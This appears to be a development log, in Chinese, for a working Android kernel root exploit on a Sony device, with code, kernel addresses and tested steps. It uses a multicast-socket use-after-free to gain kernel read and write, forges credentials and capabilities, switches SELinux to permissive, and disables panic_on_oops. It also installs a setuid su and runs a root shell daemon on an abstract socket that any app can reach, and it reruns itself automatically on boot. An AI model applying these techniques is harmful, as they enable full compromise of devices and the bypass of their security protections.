| setuid 生效 | /mnt 无 nosuid | `/proc/mounts` |

**而 `shell_tmpfs` 在 `/file_contexts` 里没有任何路径规则**——
它是纯代码设置的类型，正好适合我们手动打。

### 19.6 新方案 L1-relabel（取代 §17.9 / §18.7 全部排序）

```

      全程 Enforcing，不碰 ss_initialized，不碰 permissive_map，不跑任何 relabel 遍历

1. open("/mnt/su", O_WRONLY|O_CREAT|O_TRUNC, 0755)   → 新建标签 init_tmpfs
2. write(fd, <内存里的 su 二进制>, len); close(fd)    → 内容落地
3. chmod("/mnt/su", 04755)                            → setuid 位
4. setxattr("/mnt/su", "security.selinux",
            "u:object_r:shell_tmpfs:s0", 34, 0)       → 标签变成 shell 可执行
5. 验证：ls -lZ /mnt/su  →  -rwsr-sr-x root root u:object_r:shell_tmpfs:s0
6. adb shell 执行 /mnt/su -c id  →  uid=0
```

**为什么这个方案比之前所有的都好**：

- **零 permissive**：不需要 setenforce，不需要 load_policy，不需要 permissive_map
- **零 sidtab 风险**：不碰 `ss_initialized`，开机以来所有 sid 编号原样保留
- **零 relabel 遍历**：只改一个文件的标签，不是整树
- **零内核写**：不需要 kwrite、不需要锚点、不需要 RCU 函数调用
- **重启即复原**：/mnt 是 tmpfs，重启清空；磁盘上没有任何改动
- **失败模式温和**：任何一步失败只返回 -EACCES，不会 panic

**诚实说明它的上限**：su 执行后**仍在 shell 域**（策略里没有 `shell -> su` 的域转换，
`su` 类型根本不存在），只是 uid=0。所以 root shell 的能力受 shell 域限制
（能读大部分系统文件、能写 /data/local/tmp，但读不了别的 App 的 /data/data）。
要突破这层需要 L2（root 守护进程 + socket），不影响 L1 验收。

### 19.7 对 GLM 三条的具体回应

双落点建议仍然有价值，但优先级下降——单落点 `/mnt + shell_tmpfs` 已经闭合，

### 20.2 修正一：策略里 `isid[7]` 不是 init，是 `unlabeled`

### 20.3 修正二：没有任何域能 dyntransition 到 init

`setcon()` 走 `PROCESS__DYNTRANSITION`。全策略含 dyntransition 的条目只有 19 条：

```
runas -> shell / untrusted_app / isolated_app / radio / nfc / bluetooth / ...
zygote -> appdomain / system_server
fota-trigger -> fota-ua, fota-ua -> vold, vold -> fota-ua
```

**没有一条通向 init。** 而 `kernel -> init` 只有 `transition`（exec 时用）、
没有 `dyntransition`。所以 setcon 到 init 这条路也是死的。

（`kernel -> init_exec : file : execute,...,relabelto` 存在，理论上可以
「造一个 init_exec 类型的文件然后 exec 它」触发 transition——
但 kernel 对 tmpfs 没有 create，无法先把文件造出来，死循环。详见 20.5。）

### 20.4 所以正确做法：从 sidtab 里按 type 找 init 的 sid

`sidtab` 符号地址 `0xffffffc001880b28`（kallsyms），结构 `ss/sidtab.h`：

```c
struct sidtab { struct sidtab_node **htable; u32 nel, next_sid; u8 shutdown; ... };
struct sidtab_node { u32 sid; struct context context; struct sidtab_node *next; };
struct context { u32 user, role, type, len; struct mls_range range; };
```

`htable` 是 128 个桶（`SIDTAB_HASH_BITS = 7`），桶内按 sid 升序。
`context.type` 就是我们要找的——命中 `575`（`init`）就拿到 sid。

提权后 `kread` 不依赖 SELinux，所以可以在 kernel 域下安全遍历。
probe81 正在写：遍历 128 桶 → 找 `type==575` → 切 sid → 写 /mnt → relabel → 验证。

### 20.5 顺带排除的几条"绕路"

| 绕路 | 为什么不行 |
|---|---|
| `kernel` 域直接在 /mnt 建文件 | `kernel -> tmpfs:file` 无 create/write；`kernel -> tmpfs:dir` 也没有 create |
| `kernel` 域在 /data 建文件再 exec | `sdcard_internal` 有 create/write，但**没有 relabelfrom**，改不成 init_exec |
| 造 `init_exec` 文件 exec 触发 transition | 要在 /mnt 建文件 → 回到上一条，死循环 |
| `setenforce 0` | 全策略 0 授权（§19.3） |
| `load_policy` 改 permissive_map | 全策略 0 授权（§19.3） |

**目前唯一活着的路**：sidtab 找 init sid → 切过去 → 用 §19.5 的 relabel 链条。

### 22.3 一个可用的正解方向：把假 cred "固化"成真对象

源码依据（`kernel-exact/`）：

```c
/* kernel/cred.c : prepare_creds() */
new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
memcpy(new, old, sizeof(struct cred));      /* old = 用户页里的假 cred */
atomic_set(&new->usage, 1);
...
new->security = NULL;                       /* 关键：先把指针清掉 */
security_prepare_creds(new, old, GFP_KERNEL);

/* security/selinux/hooks.c:3450 : selinux_cred_prepare() */
old_tsec = old->security;                                       /* FAKE_TSEC 用户页 */
tsec = kmemdup(old_tsec, sizeof(struct task_security_struct), gfp);
new->security = tsec;                                           /* 真 24B 对象 */
```

**所以在 `set_tsec()` 之后调一次 `setresuid(0,0,0)`，`current->cred` 与
`cred->security` 全部落到内核堆上，用户页不再被本进程引用。**

两个配套事实：

1. **本内核没有 `selinux_task_fix_setuid`**（`hooks.c` 只有注释提及），
   即 uid/gid 变更不做 `process:setuid` 检查，这一步不会被策略拦。
2. **顺序必须先 uid 后 gid**：`cred->gid` 与 `rcu_head.func` 重叠，切域后仍是垃圾值；
   先 `setresuid`（0→0 无变化、不触发任何检查）把 cred 换成真的，
   再 `setresgid` 时 old 已是真 cred，检查走 init→init 必过。

## 32.3 `find_task_pref` 的方向性 bug（已修）

`init_task.tasks` 的 `next` 在 `hd+0`、`prev` 在 `hd+8`。
旧代码读 `hd+8`，等于**从最后创建的任务倒着走**，`init`(pid 1) 在链表最前端，
400/2000 步上限都走不到，所以历次 `find_task_pref("init")` 返回 0。
改成读 `hd+0` 正向走后，`FOUND@00000000` 一次命中。

init 的真 tsec：`osid=1, sid=0x25(37)`。
`init_cred`（swapper）的 tsec 是 `osid=1, sid=1`（kernel 域），权限不够，不能用。

## 33.2 三个决定性发现（缺一个都做不成）

### ① cap_permitted 可以写 —— 靠 fsgid/fsuid 轮流当锚点

`kwrite` 的约束：`W = S + 24 + 4·k`，且 `u32(S+4) == k`（k = sl_count，必须 < 10）、`u32(S) != k`。
要写 0x30/0x34，锚点字段只能是 fsuid（0x1c）/fsgid（0x20），两条件互斥，**但可以顺序执行**：

```c
setfsgid(0);                      // syscall 152  ← aarch64 是 152，不是 123!
cred = kread64(task + 0x4e0);     // ★ setfs* 走 prepare_creds→换新对象，必须重取
kwrite(cred + 0x34, 0x00000000);  // permitted 高 32
setfsuid(0);                      // syscall 151
cred = kread64(task + 0x4e0);
kwrite(cred + 0x30, 0xffffffff);  // permitted 低 32
```

- **坑 A**：`setfsuid=151`、`setfsgid=152`。项目里旧的 `sysc(122/123)` 是
  `sched_setaffinity/getaffinity`，用错号只会拿到 `-EINVAL`。
- **坑 B**：这两个 syscall 在 **Enforcing 下静默失败**（`security_capable()` 拒
  `capability setuid/setgid`，内核返回旧值，不报错），表现就是锚点全不成立、kwrite 返回 -2000。
  ⇒ **必须先关 SELinux，再做这一步。**

### ② exec 一定清 permitted，只有 euid==0 且 !SECURE_NOROOT 才补满

3.10 `security/commoncap.c` 实际语义：

```c
get_file_caps():       bprm_clear_caps(bprm);           // 无条件清空
cap_bprm_set_creds():  if (!issecure(SECURE_NOROOT)) {  // ← Android 置了 securebits=1，整块被跳
                           if (euid==0) permitted = bset | inheritable;
                           if (euid==0) effective = true;
                       }
```

⇒ 想靠 exec 拿 caps：**`euid==0` + `securebits & SECURE_NOROOT == 0`**。
后者用 `prctl(PR_SET_SECUREBITS, 0)`（syscall 167, option 28，需 effective 有 CAP_SETPCAP）。

### ③ app 的 no_new_privs 会把满 caps 夹回 1 —— 这是 app/shell 表现不一致的唯一原因

```c
if (unsafe & LSM_UNSAFE_NO_NEW_PRIVS)
    new->cap_permitted = cap_intersect(new->cap_permitted, old->cap_permitted);
```

app 一定有 `no_new_privs`；adb shell 没有。而 `setresuid(0,0,0)` 之后旧 permitted 只剩
`1`（CAP_CHOWN）⇒ app 里 exec 出来是"uid=0 但 CapPrm=1"。
**修法：在 setresuid 之前先把 permitted 写成 0xffffffff**（发现①），于是 `满 ∩ 满 = 满`。

> 没有这一条，会一直误判成 SELinux 或 bounding set 的问题。

## 33.4 root 服务（给其他 app 用）

- **抽象 unix socket `@z5rootd`**（SOCK_STREAM）。连 abstract socket **不需要任何权限**，
  普通 app 也能连，不受 `CapBnd=0` / SELinux 域限制。
- 服务端：`accept → fork → dup3 到 0/1/2 → 读一行 → execve("/system/bin/sh", ["sh","-c",cmd])`。
  因为 euid==0 且 NOROOT 已清，**每次 exec 自动满 caps**。
- 客户端 `/mnt/su`：优先连服务；连不上才退回"就地 setresuid + capset"。
  支持 `su -c "cmd"` 和裸 `su`（fork 双向转发交互）。
- exec 必须带最小 envp（`ANDROID_ROOT`/`ANDROID_DATA`/`PATH`/`HOME`），否则 bionic 会刷
  `__bionic_open_tzdata_path: ANDROID_DATA not set!`。

## 33.5 force-stop 会 panic —— cgroup 迁移解决

`am force-stop com.z5.root` 曾必然重启。原因：force-stop 按 `/acct/uid_<原始appuid>/cgroup.procs`
枚举杀进程；`setresuid(0)` 只改数字，进程还在 `uid_10257` cgroup 里 → 被杀 → 关掉被 UAF 的
socket → `ip_mc_drop_socket()` 走悬空链表 → panic。

修法：`setsid()` + 把 pid 写进 `/acct/uid_0/cgroup.procs` + `oom_score_adj=-1000`。
实测修好后 force-stop 不重启，root 继续可用。

  `brcm_hci_ldisc` 的 `brcm_hci_snoop()` 在 `flush_to_ldisc()` 的原子上下文里

  是 Sony 原厂蓝牙驱动的既有问题，与 exploit 无关，也不引发 panic。
- **不是 force-stop / LMK**：已用 setsid + cgroup 迁移 + oom_score_adj 处理过。
- **不是 SIGPIPE**：app 是用 `exec ./z5root > out.txt 2>&1` 起的，
  stdout 是普通文件而不是管道，不存在对端关闭。
- **不是 `g_rbuf` 越界**：`g_rbuf` 在 0x30000000 映射了 0x2000，
  `kread_at2` 最多写到 `16+0x800 = 0x810`，没有溢出。
- **顺带修掉一个真 bug**：同 boot 内"重跑"时，旧的 `./z5root` 还在运行，
  `drop()` 原地覆盖会拿到 `ETXTBSY (Text file busy)`，`work()` 直接抛异常，
  表现为"点了重跑但什么都没发生"。已改成写 `.new` 再 `rename()` 覆盖。

### 为什么没法定位（这是真正的卡点）
1. `/proc/sys/kernel/panic_on_oops = 1`、`panic = 5` —— 任何 oops 立刻 panic，
   5 秒后重启，**不会留下可读现场**。
2. 设备**没有** `/proc/last_kmsg`，也**没有** `/sys/fs/pstore`（Sony 这版没开 ramoops）。
3. 宿主机侧 `adb shell dmesg -w` 不可行：Android 6 toybox 的 dmesg **不支持 `-w`**；
   改成轮询也没用 —— panic 后内核停摆、adbd 先死，消息来不及送出。
4. `klogw` 写 `/data/local/tmp/klog.txt`，但该目录 `drwxrwx--x`，
   **app 域建不了文件**，所以 app 触发时没有 kmsg 落盘。
5. `klogw` 抓不到 panic：它每 5ms `READ_ALL` 轮询 + fsync，但 panic 时内核
   立刻停摆，调度器不再运行，没有机会再落盘。
6. **"先把 `panic_on_oops` 写 0"这个思路，实测只在"已经拿到 root 的同一个 boot"里可行，
   而那种状态下故障不复现**：
   实测在 root 在位时 `echo 0 > /proc/sys/kernel/panic_on_oops` 成功（读回 0），
   随后清掉 `lastboot.txt`/`running.txt` 触发重跑 —— 结果是**成功**，
   dmesg 里 0 条新增 oops。也就是说故障只出现在**冷启动后的第一次**尝试，
   而那个时刻 `panic_on_oops` 一定是 1。这是个死结。

### 结论
**当前无法拿到 oops/panic 现场。** 已知的全部信息只有：
- 4 次冷启动触发里 2 次重启（另一次实验 6 次里 2 次），概率约 1/4~1/2；
- 重启发生在 `am start` 之后约 50~90 秒；
- 重启前 exploit 已经完成了 spray、LEAVE、kread 定位（这些步骤本身在成功轮次里也会做）。

### 可能需要 GLM 帮忙的方向
- 在没有 last_kmsg / pstore / 串口的 user build 上，**怎么拿到 panic 的 oops**？
  （有没有 Sony 特有的 crash dump 路径？`/data/rdimage`、`crashmonitor`、
  `dumpstate` 的 kernel log 备份？）
- 或者绕开诊断：**怎么让 `ip_mc_msfget` 的 kread 在原语层面不 fault**
  （例如先探测地址有效性、或用 `sl_max` 做边界保护），
  让失败的尝试变成"返回 -1"而不是"oops"？
- 或者：能不能在**触发之前**就把 `panic_on_oops` 写 0？
  （需要先有 kwrite，但 kwrite 正是可能 fault 的那一步。）

# 34. 2026-11-11 04:0x —— ★ 33.11 那个"死结"已解开

## 34.1 崩溃点：`MCAST_LEAVE_GROUP`（不是 cap 写）

现场 `out.txt` 结尾是 `... J00000000` + `234L`，缺 `m`。
`mark('m')` 在 `setsockopt(ser, SOL_IP, MCAST_LEAVE_GROUP, ...)` 返回之后才打，
所以崩在 `ip_mc_leave_group()` 内部：

```c
*imlp = iml->next;                       // iml 是已被回收的 UAF 对象
...
sock_kfree_s(sk, iml, sizeof(*iml));     // 二次 free -> panic
```

这一步在**拿到读写原语之前**，所以没法提前关 `panic_on_oops`，
失败必然整机重启。之前"拿不到现场"的死结，实际是被这个认知错误拖住的：
`out.txt` 已经足够定位，不需要 oops。

## 34.2 新增原语 `kdec(target)`：把目标处 u32 减 1

走 `IP_UNBLOCK_SOURCE`（optname 37）→ `ip_mc_source(add=0, omode=MCAST_EXCLUDE)`：

| 条件 | 说明 |
|---|---|
| `sl_count == 1` | 必须。此时 `for (j=i+1; ...)` 空转，不会顺带写 `sl_addr[0]` |
| `omode == MCAST_EXCLUDE` | `ip_sockglue.c:805` 固定如此，所以不会命中 `leavegroup` 分支 |
| `src == *(u32*)(target+0x10)` | 先 kread 出来再传，否则 `-EADDRNOTAVAIL` |
| 效果 | `*(u32*)target` 减 1，其余内存不动 |

**用途①（已上线）**：`panic_on_oops`（`0xffffffc0017e14f0`，冷启动恒为 1）→ 0。
此后任何 fault 只 kill 进程，不重启整机。

**用途②（已上线）**：`selinux_enforcing` 1 → 0，就是原来的 DEC 步骤，现在复用同一个函数。

> 附带确认：**内核没开 KASLR**。`/proc/kallsyms` 的 `selinux_enforcing` =
> `0xffffffc00187d47c`，与硬编码常量一致；`panic_on_oops` = `0xffffffc0017e14f0`。

## 34.3 两层重试：让"点一次"变成确定事件

| 层 | 覆盖的失败模式 | 实现 |
|---|---|---|
| ① 同 boot 原地重试 ×3 | LEAVE 返回 `-EADDRNOTAVAIL` 后安全挂住（无 panic） | `MainActivity.work()` 循环起 exploit，每轮轮询 48s |
| ② 跨 reboot 自动续跑 ×3 | LEAVE 内部崩 → panic 重启 | 点击时写 `pending.txt`；`BootReceiver` 收 `BOOT_COMPLETED` 自动拉起；成功后删除 |

`pending.txt` = "用户点过 root、这次授权还没兑现"。
**没有它开机绝不跑**（实测日志 `boot: pending 不存在, 不自动跑`）。

新增清单：

## 34.4 三个必须记住的坑

1. **点了不能立刻 `finishAndRemoveTask()`** —— 后台线程会随进程被回收，
   重试根本不会发生（实测 3 次重试 0 次执行）。改成跑完停 6 秒再 finish。
2. **未启动过的应用收不到 `BOOT_COMPLETED`**（Android 3.1+）。
   `dumpsys package` 里必须是 `stopped=false notLaunched=false`。
   反复 `adb install -r` 会把它打回 `notLaunched=true`，验收脚本改成只装一次。
3. **root 手写 `pending.txt` 要 `chown` + `restorecon`**，否则 Enforcing 下 app 读不到。

## 35.1 已 root 时按"重跑"不再重建 UAF（重要）

旧 `work()` 无条件跑 exploit。root 已就位时再跑一遍收益为 0，风险却是

```java

if (rootReady()) {                 // /mnt/su 有 s 位 且 su -c id 真出 uid=0
    writeFile(dir + "/lastboot.txt", bootId());

    return;
}
```

**不会误判**：重启后 SELinux 回 `Enforcing`，`/mnt/su` 虽在但 exec 被 avc 拒，
`rootReady()` 自然 false ⇒ 该跑的时候照跑。

## 35.2 zombie 泄漏：`serve_root()` 从未回收子进程

`ps` 实测 11 个 `z5root <defunct>`，父进程都是 root 的 `./z5root`。
根因：服务是 fork-per-request（每条 `su -c` fork 一个子进程 exec sh），
父进程不 `wait`。每小时约涨 40 个。不致命但脏。

修法（已进 `probe_app.c` / `probe149s.c`）：

```c
struct { unsigned long h, fl, rs, mk; } sa;
sa.h = 1; sa.fl = 0; sa.rs = 0; sa.mk = 0;   // SIG_IGN
sysc(134, 17, (long)&sa, 0, 8, 0, 0);        // rt_sigaction(SIGCHLD)
```

aarch64 `struct sigaction` = handler/flags/restorer/mask（asm-generic 布局）；
`rt_sigaction`=134，`SIGCHLD`=17。**已存在的 11 个僵尸只有父进程能回收**，
下一轮触发 root 后归零。

## 35.10 僵尸归零（SIGCHLD 之前加错地方了）

从不 `wait()`。与 su 调用次数无关。

1. 10 个 fork 之后立刻 `rt_sigaction(SIGCHLD, SIG_IGN)`；
2. 起守护进程前 `wait4(-1, NULL, WNOHANG=1, NULL)` 循环收掉已有僵尸。
